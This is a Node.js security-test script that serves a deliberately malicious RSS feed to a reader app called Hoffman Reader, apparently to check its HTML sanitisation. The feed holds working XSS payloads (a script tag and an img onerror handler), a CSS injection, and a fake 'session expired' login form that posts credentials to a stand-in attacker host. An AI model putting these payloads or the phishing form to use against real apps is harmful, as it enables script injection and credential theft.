/**
 * MALICIOUS RSS FEED SERVER — FOR SECURITY TESTING ONLY
 *
 * This simulates what a real attacker could do: publish an RSS feed that
 * looks normal but contains XSS payloads hidden inside article content.
 *
 * Run: node test-xss-feed.js
 * Then add http://localhost:8642/feed as a feed in the app.
 */

const http = require('http');

const MALICIOUS_FEED = `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Totally Legit News</title>
    <link>http://localhost:8642</link>
    <description>A perfectly normal news feed, nothing to see here.</description>

    <item>
      <title>Breaking: Major Discovery in Science</title>
      <link>http://localhost:8642/article-1</link>
      <guid>attack-1-script-tag</guid>
      <pubDate>${new Date().toUTCString()}</pubDate>
      <description>A fascinating article about science.</description>
      <content:encoded><![CDATA[
        <h2>Interesting Article</h2>
        <p>This looks like a normal article, but hidden below is a script tag:</p>

        <!-- ATTACK 1: Classic script injection -->
        <script>
          document.title = 'HACKED — XSS via script tag!';
          alert('XSS Attack #1: Script tag executed!\\n\\nThis JavaScript is running inside your Electron app.\\nA real attacker could steal data or modify the UI.');
        </script>

        <p>If you see an alert box, the attack worked.</p>
      ]]></content:encoded>
    </item>

    <item>
      <title>Top 10 Travel Destinations for 2026</title>
      <link>http://localhost:8642/article-2</link>
      <guid>attack-2-event-handler</guid>
      <pubDate>${new Date().toUTCString()}</pubDate>
      <description>Beautiful places to visit this year.</description>
      <content:encoded><![CDATA[
        <h2>Travel Guide</h2>
        <p>Check out this beautiful photo:</p>

        <!-- ATTACK 2: Event handler injection — runs JS when the broken image fails to load -->
        <img src="https://doesnotexist.invalid/photo.jpg"
             onerror="document.title='HACKED — XSS via onerror!'; this.outerHTML='<div style=\\'padding:20px;background:red;color:white;font-size:24px;border-radius:8px;margin:16px 0\\'>⚠️ XSS Attack #2: onerror handler executed JavaScript!</div>'" />

        <p>Nice destinations, right?</p>
      ]]></content:encoded>
    </item>

    <item>
      <title>Recipe: Grandma's Secret Pasta</title>
      <link>http://localhost:8642/article-3</link>
      <guid>attack-3-html-injection</guid>
      <pubDate>${new Date().toUTCString()}</pubDate>
      <description>A delicious pasta recipe.</description>
      <content:encoded><![CDATA[
        <h2>Grandma's Pasta</h2>
        <p>Before the recipe, please verify your identity:</p>

        <!-- ATTACK 3: Phishing via HTML injection — no JavaScript needed, works even with CSP! -->
        <div style="border:2px solid #e53e3e; border-radius:12px; padding:24px; margin:20px 0; background:linear-gradient(135deg, #fff5f5, #fed7d7);">
          <h3 style="margin:0 0 8px 0; color:#c53030;">⚠️ Session Expired</h3>
          <p style="color:#742a2a; margin:0 0 16px 0;">Your Hoffman Reader session has expired. Please re-enter your credentials to continue reading.</p>
          <form action="https://evil-attacker-site.example.com/steal" method="POST" style="display:flex; flex-direction:column; gap:8px;">
            <input type="email" placeholder="Email address" style="padding:8px 12px; border:1px solid #cbd5e0; border-radius:6px;" />
            <input type="password" placeholder="Password" style="padding:8px 12px; border:1px solid #cbd5e0; border-radius:6px;" />
            <button type="submit" style="padding:10px; background:#c53030; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">
              Sign In to Continue Reading
            </button>
          </form>
          <p style="font-size:11px; color:#a0aec0; margin:8px 0 0 0;">This is a FAKE form injected via RSS. Credentials would be sent to the attacker's server.</p>
        </div>

        <p>Mix the flour with eggs...</p>
      ]]></content:encoded>
    </item>

    <item>
      <title>Stock Market Update: Bull Run Continues</title>
      <link>http://localhost:8642/article-4</link>
      <guid>attack-4-css-injection</guid>
      <pubDate>${new Date().toUTCString()}</pubDate>
      <description>Markets hit all-time highs.</description>
      <content:encoded><![CDATA[
        <!-- ATTACK 4: CSS injection — manipulate the entire app's UI -->
        <style>
          /* Hide the real sidebar and replace with attacker content */
          body::after {
            content: '🔓 CSS Injection Active — attacker can restyle the entire app';
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #e53e3e;
            color: white;
            padding: 8px 16px;
            font-size: 13px;
            font-weight: bold;
            z-index: 99999;
            text-align: center;
          }
        </style>

        <h2>Markets Soaring</h2>
        <p>The S&P 500 closed at record highs today. If you see a red bar at the bottom of the app window, CSS injection is working — an attacker can restyle your entire application to trick you.</p>
      ]]></content:encoded>
    </item>

  </channel>
</rss>`;

const server = http.createServer((req, res) => {
  if (req.url === '/feed') {
    res.writeHead(200, { 'Content-Type': 'application/rss+xml' });
    res.end(MALICIOUS_FEED);
    console.log(`[${new Date().toISOString()}] Served malicious feed to ${req.headers['user-agent']}`);
  } else {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Malicious Feed Server</h1><p>Add <code>http://localhost:8642/feed</code> as an RSS feed in Hoffman Reader.</p>');
  }
});

server.listen(8642, () => {
  console.log('\n🔴 MALICIOUS RSS FEED SERVER RUNNING');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('Add this feed URL in Hoffman Reader:');
  console.log('  http://localhost:8642/feed');
  console.log('');
  console.log('4 attacks embedded:');
  console.log('  1. <script> tag        — runs arbitrary JavaScript');
  console.log('  2. <img onerror="">     — runs JS via event handler');
  console.log('  3. <form> injection     — phishing (no JS needed!)');
  console.log('  4. <style> injection    — manipulates app UI via CSS');
  console.log('');
  console.log('Press Ctrl+C to stop.\n');
});
